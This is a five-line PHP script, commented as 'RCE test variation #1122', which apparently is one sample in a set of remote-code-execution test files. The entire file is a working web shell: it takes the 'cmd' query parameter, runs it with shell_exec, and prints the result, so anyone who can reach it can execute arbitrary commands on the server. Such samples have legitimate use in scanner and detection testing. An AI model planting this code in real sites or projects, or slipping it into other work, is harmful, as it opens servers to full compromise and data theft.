<?php
// RCE test variation #1122
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>